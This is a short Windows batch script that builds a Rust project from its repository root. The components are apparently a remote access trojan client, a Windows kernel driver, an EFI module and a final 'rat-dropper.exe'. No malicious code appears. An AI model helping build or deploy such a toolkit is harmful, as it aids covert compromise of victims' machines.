@echo off

for %%f in ("%~dp0..") do set root=%%~ff
cd /d %root%

echo Found repository root: %root%

cd /d %root%
cargo build -p rat-client --release

cd /d %root%\rat-driver
cargo wdk build --profile release

cd /d %root%\rat-efi
cargo build --release

cd /d %root%
cargo build --release

echo Dropper at %root%\target\release\rat-dropper.exe
